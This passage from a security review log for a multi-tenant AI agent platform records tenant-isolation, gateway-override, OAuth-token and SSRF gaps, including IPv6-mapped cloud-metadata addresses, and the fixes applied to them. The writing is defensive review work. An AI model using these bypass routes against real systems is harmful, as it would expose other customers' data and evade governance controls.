  - A KB domain-service minden agent-/ticket-belépője `actorTenantId`-t kap és fail-closed
    módon ellenőrzi az elérhetőséget (`assertAgentReachable` / `assertTicketAgentReachable`);
    a cross-tenant hozzáférés opak `Agent not found` / `KB ticket not found` (nincs
    létezés-oracle).
  - A prisma-direkt KB actionök (`processDocumentForWiki`, `listDocumentsForAgent`,
    `share/unshareKnowledgeBaseWithAgent`, `getKnowledgeBaseSharing`, `deleteKbDocument`)
    `assertAgentTenantReachable` őrt kaptak a forrás- ÉS cél-agentre.
  - Új determinisztikus teszt: `scripts/kb-tenant-boundary.test.ts` (10 eset:
    tiszta szabály + request/approve/reject/getReview/listPending cross-tenant deny +
    saját-tenant/megosztott allow), `test:kb-tenant-boundary`. A `knowledge-base-gate.test.ts`
    happy-path suite frissítve (actorTenantId) és zöld; tool-broker-tenant zöld; a módosított
    fájlok tsc/eslint tiszták.
- Üzleti hatás:
  - Megakadályozza, hogy egy ügyfél-tenant KB-adminisztrátora belásson vagy beleírjon egy
    másik ügyfél-tenant tudásbázisába — a tudásbázis a platform legérzékenyebb, ügyfél-tulajdonú
    tartalma. A tenant-határ a domain-rétegbe kerül, ahol a runtime és az audit ugyanazt az
    invariánst látja.
- Nyitott döntések (nem auto-javítva):
  - D1 — `Document`-nek nincs saját `tenantId` oszlopa; a tenant a connectoron / feltöltőn át
    származtatott. A `requestDocument` jelenleg tetszőleges CSATLAKOZATLAN documentId-t elfogad,
    ha a cél-agent elérhető; egy szigorúbb modell a dokumentum feltöltőjének tenantját is
    ellenőrizné (schema-bővítés kellhet).
  - D2 — `shareKnowledgeBaseWithAgent` megengedi, hogy egy tenant-saját KB-t egy MEGOSZTOTT
    (null) cél-agenthez kössenek, ami platform-szintűvé tehet ügyfél-tartalmat. A reachability
    ezt (a demó globális agentjei miatt) nem tiltja; termék/biztonsági döntést igényel, hogy a
    megosztott agent lehet-e tenant-saját KB célpontja.

## 2026-07-07 - IAM/RBAC tenant-context boundary (permission matrix + access audit)

- Reviewed modules:
  - `app/src/domain/iam/iam-service.ts` (invite/redeem/approve/role-change/suspend/reactivate, tenant-scoped target loading, last-admin lock, permission matrix update)
  - `app/src/auth/tenant-context.ts` (tenant membership / superadmin assume resolution, `requireTenantPermission`)
  - `app/src/auth/permission.ts` (legacy user-role based `requirePermission`)
  - `app/src/app/actions/platform.ts` IAM server actions (`listUsers`, invitation/user lifecycle, permission matrix, access audit)
  - `app/src/repositories/postgres/iam-repository.ts` and `app/src/repositories/postgres/audit-repository.ts`
  - `app/src/lib/iam-policy.ts`, `app/src/auth/context.ts`, `app/prisma/schema.prisma` IAM/tenant models
- Result:
  - The IAM domain service already enforces the important enterprise invariants for user lifecycle operations: tenant-scoped target lookup, self-modification denial, last active admin lockout, one-time invitation redemption, and append-only audit events.
  - Found a tenant-boundary gap in the IAM admin surface. The permission matrix and access-audit actions still used legacy `requirePermission`, which decides from the global `User.role`, not the active `TenantMembership` / superadmin-assume tenant context. In a migrated multi-tenant deployment this can deny a valid tenant admin whose membership is correct but legacy `User.role` is stale/null, and it can also apply/read IAM governance outside the selected tenant context. `getAccessAuditLog` also listed all access audit rows matching the action names, with no `tenantId` filter.
- Fix applied:
  - `getPermissionMatrix`, `updateRolePermission`, and `getAccessAuditLog` now use `requireTenantPermission`, so the active tenant membership or explicit superadmin assume context is the authorization boundary.
  - Access audit list construction moved to `buildTenantAccessAuditFilter`, which always includes the active tenant id and the fixed access-audit action allowlist.
  - `IamService.updatePermission` now writes explicit `tenantId` attribution and includes the tenant id in metadata for `user.permission.update`.
  - Added `scripts/iam-tenant-boundary.test.ts` and `test:iam-tenant-boundary` to cover tenant-scoped access-audit filters and permission-update audit attribution.
- Business impact:
  - Prevents IAM administration and access audit review from accidentally crossing customer tenant boundaries.
  - Aligns the admin UI with the platform's current multi-tenant model: tenant membership and superadmin assume mode are the source of authority, not legacy single-tenant user-role fields.
  - Improves audit evidence for enterprise customers because permission-matrix changes are attributable to a specific tenant context.
- Verification:
  - `npm run test:iam-tenant-boundary --prefix app`
  - `npm run test:iam-policy --prefix app`
  - `npm run test:tenant-management --prefix app`
  - `npx eslint src/domain/iam/iam-service.ts src/domain/iam/access-audit.ts src/app/actions/platform.ts scripts/iam-tenant-boundary.test.ts` from `app/`
- Decisions raised (not auto-fixed):
  - D1 — `RolePermission` is still a global table. The current fix scopes the action boundary and audit visibility by active tenant, but the matrix value itself remains platform-wide. If customers need tenant-specific IAM policies, the schema should add `tenantId` to `RolePermission` with a platform-default fallback.

## 2026-07-07 - Tool Broker: agent-oldali tenant-izoláció (delegálás + felderítés)

- Reviewed modules:
  - `app/src/domain/tool-broker/tool-broker-service.ts` (a governance-chokepoint:
    `AllowlistAuthorizer.authorize`, `ToolBrokerService.invoke`/`executeTool`,
    gmail-send jóváhagyás, http_api/file/sandbox/repo végrehajtók, acting-user/tenant
    feloldás, `agentResolve`/`agentCatalog`/`agentAsk`/`ticketCreate`/`userDirectory`)
  - `app/src/lib/agent-catalog.ts` (`buildAgentCatalogEntry` — teljes capability/connector belépő)
  - `app/prisma/schema.prisma` `Agent.tenantId` (nullable → megosztott vs tenant-saját agent)
  - `app/prisma/seed.ts` (a demo agentek mind globálisak, tenantId null)
- Result:
  - A Tool Broker törzse enterprise-helyes: fail-closed capability/role-template kapu,
    connector lifecycle- és tenant-izoláció a connectorokon, delegált OAuth-token
    injekció client_secret-szivárgás nélkül, append-only tool-call audit.
  - Talált tenant-izolációs rést az AGENT-irányú toolokban. A `user_directory` és a
    `ticket_create` HUMÁN-felelős ága kifejezetten tenant-szűrt ("cross-tenant user
    SOHA nem szivárog ki"), de az `agent_resolve`, `agent_catalog`, `agent_ask`, és a
    `ticket_create` AGENT-felelős ága a teljes agent-táblán dolgozott (`agents.findMany()` /
    `findById()` tenant-szűrő nélkül). Multi-tenant telepítésen ez egy tenant agentjének
    engedte, hogy (a) felderítse egy másik tenant agentjeinek nevét, szerepét és TELJES
    capability-/connector-katalógusát, és (b) cross-tenant agentnek delegáljon feladatot
    (confused deputy — a célagent a saját connectorai/tudásbázisa felett dolgozna egy idegen
    tenant kérdésén). A demóban minden agent globális (tenantId null), ezért ma nem éles,
    de pontosan a multi-tenant enterprise használatban válik kihasználhatóvá.
- Fix applied:
  - Új tiszta szabály: `isAgentReachableFromTenant(agentTenantId, effectiveTenantId)` —
    megosztott (null) agent bárhonnan elérhető, egyébként csak azonos tenant; plusz a
    `filterAgentsByTenant` lista-szűrő. Ez a `user_directory` tenant-izolációjának
    agent-oldali párja (defense-in-depth, sosem fail-open).
  - `agent_resolve` és `agent_catalog` (lista- ÉS `agentId`-direktlookup-ág is) a hívó
    effektív tenantjára szűr (`resolveCallerTenantId` = acting-user tenant, különben a
    hívó agent tenantja — a `user_directory` mintája). `agent_ask` és a `ticket_create`
    agent-felelős ága elutasítja a cross-tenant célagentet (a delegálás-ticket tenantja,
    különben a cselekvő felhasználó tenantja a referencia).
  - Új determinisztikus teszt: `scripts/tool-broker-tenant-isolation.test.ts` (8 eset:
    pure szabály + agent_resolve szűrés + agent_catalog direkt-lookup + agent_ask/
    ticket_create cross-tenant deny), `test:tool-broker-tenant`. A kapcsolódó suite-ok
    (tool-broker-bridge, user-directory, repo-pr, tool-loop) zöldek; a módosított fájlok
    tsc/eslint tiszták.
- Business impact:
  - Megakadályozza, hogy egy tenant agentje (vagy egy prompt-injektált agent) felderítse
    vagy elérje egy másik ügyfél-tenant agentjeit — se adat-, se capability-, se
    delegációs úton. A tenant-határ a domain-rétegbe kerül, ahol a runtime és az audit
    ugyanazt az invariánst látja.
- Decisions raised (not auto-fixed):
  - D1 — `checkGmailSendApproval` a jóváhagyó ticketet ID alapján, tenant/agent-kötés és
    egyszer-használatosság (replay-védelem) nélkül fogadja el; a tényleges küldést a
    per-user grant korlátozza ugyan a saját postafiókra, de a per-küldés emberi jóváhagyás
    újrafelhasználható. Termék/biztonsági döntést igényel (kötés a konkrét draft-hoz + consume).
  - D2 — `argsMeta` a `ticket_create`-nél `Object.keys(input.args.payload)`-t hív; ma a séma
    kötelezővé teszi a payloadot (`?? {}`), de egy hiányzó payload a hiba-ági auditban
    TypeError-t dobna. Robusztusság-nit, külön javítható.

## 2026-07-06 - Governed Flow Builder: Playbook v2 compile + runtime path

- Reviewed modules:
  - `app/src/lib/playbook-v2/runtime.ts` (deterministic transition + advance engine)
  - `app/src/lib/playbook-v2/process-step-payload.ts` (step outcome + output contract)
  - `app/src/lib/playbook-v2/step-output-inference.ts`
  - `app/src/domain/playbook/playbook-compiler.ts`
  - `app/src/domain/playbook/playbook-validator.ts`
  - `app/src/domain/playbook/process-service.ts` (advance / concurrency hardening)
  - `app/src/domain/agent/general-task-runtime.ts` (step outcome enforcement path)
- Result:
  - The governed orchestration core has the right enterprise shape: gate-bypass is
    fail-closed (agent/system can never cross a blocking human gate), the cascade
    protection routes `blocked`/`failed` step outcomes away from the happy path, and the
    recent concurrency hardening (idempotency guard + conditional status writes) targets a
    real "stuck running" race.
  - Found a correctness gap in output-contract inference. `inferStepOutputFields` only
    walked `step.onComplete`, but Decision Steps (WP-8) route via `decision.branches` /
    `fallback` (desugared to onComplete at compile time). A decision branch leading to a
    step with a required `step`-source input slot never had that field inferred into the
    decision step's output contract, so neither the validator warned nor the runtime
    enforced it — the decision step closed silently as `ok` and the process only blocked
    later at the next step's creation (`output_contract_unmet` class).
- Fix applied:
  - `inferStepOutputFields` now collects next-step targets from both `onComplete` and
    `decision.branches` / `decision.fallback` via a local `happyPathNextStepIds` helper,
    consistent with the compiler's `desugarDecision` and the validator's `buildAdjacency`
    (traversal inlined to avoid a circular import).
  - Added 2 regression tests in `playbook-process-lifecycle.test.ts` (branch + fallback
    field inference and compiler `outputRequiredFields` pass-through). Full playbook-v2
    core/runtime/process/governed/lifecycle/process-def suites green; eslint clean.
- Decisions raised (not auto-fixed; see `docs/code-review/2026-07-06-playbook-runtime-decisions.md`):
  - D1 — `StepOutcomeSignals.toolDenied` is unreachable code: the tool loop never surfaces
    a mid-loop broker denial, so a step can close `ok` despite a governance-denied tool
    call. Needs a product/security decision on whether denial should hard-fail the step.
  - D2 — the `await_gate` / `await_human` advance branches lack the terminal-status guard
    that `next_step` / `complete` use; unreachable today under the single-active-step
    invariant, but a defense-in-depth inconsistency.

## 2026-07-06 - Model Gateway governed routing / request model override

- Reviewed modules:
  - `app/src/domain/gateway/model-gateway.ts`
  - `app/src/domain/gateway/routing-engine.ts`
  - `app/src/domain/gateway/sensitivity-router.ts`
  - `app/src/domain/gateway/budget-engine.ts`
  - `app/src/app/api/v1/gateway/v1/chat/completions/route.ts`
  - `app/src/lib/harness-model-config.ts`
  - `app/scripts/model-gateway-negative.test.ts`
- Result:
  - The Model Gateway already centralizes provider calls, sensitivity classification, budget guardrails, model-call audit records, and provider abstraction in a shape that is appropriate for enterprise control-plane enforcement.
  - Found a governance bypass in the OpenAI-compatible gateway API path. A caller-provided `model` value was merged into `modelConfig` before entering the gateway, so the routing engine treated it as the agent's registry model. Without an explicit routing policy this let a request choose another model identifier, which can bypass central cost, vendor, residency, and approval expectations.
  - Found that the routing engine's `overrideHint` contract was documented as low trust but, if used, would have accepted the override before policy evaluation. That is the wrong default for an enterprise AI gateway because request-level preferences must be opt-in governance decisions, not caller authority.
- Fix applied:
  - Request-selected models now travel as `modelOverrideHint` instead of overwriting the agent registry `modelConfig`.
  - `RoutingEngine` ignores request model overrides by default and honors them only when the matched routing policy explicitly sets `allowRequestOverride: true`; optional provider/model allowlists further constrain which override can be used.
  - The `/api/v1/gateway/v1/chat/completions` response now reports the actual model used by the gateway, so clients and audit evidence do not claim that a denied override was honored.
  - Added MG-N7 negative tests covering default-deny override behavior, explicitly allowlisted override behavior, and denied unallowlisted override behavior.
- Business impact:
  - Prevents API clients, harnesses, or compromised agents from silently switching to unapproved, more expensive, or non-compliant model backends.
  - Keeps model routing, vendor selection, and data-governance decisions in the platform control plane where administrators can review and audit them.
  - Improves customer-facing transparency by returning the actual model that processed the request.

## 2026-07-01 - Per-user connector grant / OAuth token vault

- Reviewed modules:
  - `app/src/domain/connector-grant/connector-grant-service.ts`
  - `app/src/domain/connector-grant/grant-token-vault.ts`
  - `app/src/domain/connector-grant/gmail-scopes.ts`
  - `app/src/domain/connector-grant/gmail-api-client.ts`
  - `app/src/domain/tool-broker/tool-broker-service.ts` delegated Gmail/token integration
  - `app/src/app/actions/connector-grants.ts`
  - `app/src/app/api/connectors/oauth/callback/route.ts`
  - `app/src/repositories/postgres/connector-grant-repository.ts`
  - `app/prisma/schema.prisma` `ConnectorGrant` model
  - `app/scripts/per-user-connector.test.ts`, `app/scripts/s7-live-smoke.ts`, `app/scripts/acceptance-e2e.ts`
- Result:
  - Found that token issuance and grant status changes relied too much on callers passing a previously authorized `grantId`. The domain service did not independently re-check that the grant belonged to the acting user, tenant, connector, and token reference before loading the token vault. In an enterprise environment this is a defense-in-depth gap: a future integration bug could turn a valid grant id into cross-user delegated mailbox access.
  - Found that initial OAuth token exchange accepted missing `refresh_token` and did not reject provider-returned scopes that were wider than the scopes requested through state. For long-lived delegated access, both should fail closed.
- Fix applied:
  - `ConnectorGrantService` now reloads and verifies grant ownership before token resolution, revoke, and expiry marking.
  - OAuth exchange now requires `access_token` and `refresh_token`, and rejects unrequested provider scopes.
  - OAuth refresh now requires a returned `access_token`.
  - Tool broker and connector-grant action/smoke callers now pass explicit tenant/user expectations.
  - Added deterministic per-user connector tests for the token ownership invariant.
- Business impact:
  - Reduces the risk that one user's delegated Gmail/Workspace token can be used by another user or tenant because of a caller-side bug.
  - Keeps delegated grants least-privilege even if an OAuth provider response is malformed or unexpectedly broad.
  - Moves critical access-control rules into the domain layer, where enterprise audit and runtime paths share the same invariant.

## 2026-07-04 - Web fetch / egress guard SSRF boundary

- Reviewed modules:
  - `app/src/domain/net/egress-guard.ts`
  - `app/src/domain/web-fetch/web-fetch-service.ts`
  - `app/src/domain/web-fetch/content-sanitize.ts`
  - `app/src/domain/web-fetch/web-fetch-types.ts`
  - `app/src/domain/index.ts` production `WebFetchService` DNS resolver wiring
  - `app/scripts/egress-guard.test.ts`
  - `app/scripts/web-fetch.test.ts`
- Result:
  - The web fetch path already had the right enterprise shape: deny-by-default source URL checks, HTTPS-only fetches, manual redirect handling, content-type and size caps, hash-only audit metadata, and production DNS resolution before fetch.
  - Found a defense-in-depth gap in the resolved-IP classifier. It blocked common private ranges but did not cover several reserved IPv4 ranges, IPv6 documentation/transition/multicast prefixes, or compressed IPv4-mapped IPv6 forms such as `::ffff:a9fe:a9fe`. In production, that could let an allowlisted hostname that resolves unexpectedly to a special-use address get further than intended before the network layer fails or behaves inconsistently.
- Fix applied:
  - IP literal host detection now uses Node's IP parser, so bracketed IPv6 literals are rejected as raw IP hosts as well as IPv4 literals.
  - DNS rebinding checks now classify broader IPv4 reserved ranges and IPv6 loopback, ULA, link-local, multicast, documentation, transition, IPv4-mapped, IPv4-compatible, and NAT64 metadata/private forms.
  - Added egress guard and web fetch tests for IPv6-mapped metadata resolution and additional reserved ranges.
- Business impact:
  - Reduces the chance that AI-driven web discovery can be abused to reach cloud metadata services, internal networks, or special-use network ranges through DNS tricks.
  - Makes the documented "reserved IP re-check" behavior match the actual runtime behavior more closely, which is important for enterprise security review and audit evidence.
  - Keeps the mitigation in the shared server-side egress guard, so callers cannot accidentally bypass it by constructing a different web fetch flow.
